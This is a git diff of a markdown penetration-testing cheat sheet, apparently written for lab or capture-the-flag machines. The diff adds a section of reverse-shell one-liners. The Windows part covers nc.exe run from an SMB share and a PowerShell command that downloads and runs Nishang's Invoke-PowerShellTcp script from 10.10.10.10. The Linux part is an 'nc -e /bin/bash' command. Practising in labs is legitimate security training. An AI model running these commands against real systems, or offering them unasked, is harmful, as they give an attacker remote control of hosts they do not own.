@@ -520,7 +520,7 @@ Look for `SeImpersonatePrivilege` to `Enabled` with `whoami /priv`
 
 ## Misc
 
-Didn't know how to name this category.  
+Didn't know how to name and sort this category.  
 When I started I was struggling with downloading / uploading or executing files and scripts between my machine (kali) and the box I was attacking, now that I'm more comfortable let me share this.
 
 ### Hosting files on Kali
@@ -543,6 +543,7 @@ Files in current directory available at `\\$HOST\share\$FILE`
 For example if you have basic command execution on server but no reverse shell yet, you can start smbserver with nc.exe in current directory, and execute the following command to get a reverse shell :  
 `\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe`  
 (Of course you need to setup a listener beforehand with `nc -nvlp 1337`)  
+Also check [here](#reverse-shells-from-code-execution-on-windows)  
 
 ### Downloading & Uploading files on Linux
 
@@ -597,4 +598,24 @@ copy \\$IP\share\$FILE .
 
 # exec
 \\$IP\share\$FILE.exe
+```
+
+### Reverse shells from code execution on Windows
+
+- Basic shell
+
+```
+\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe
+```
+
+- Powershell with [Nishang](https://github.com/samratashok/nishang)
+
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1337
+```
+
+### Reverse shells from code execution on Linux
+
+```
+nc 10.10.10.10 1337 -e /bin/bash
 ```
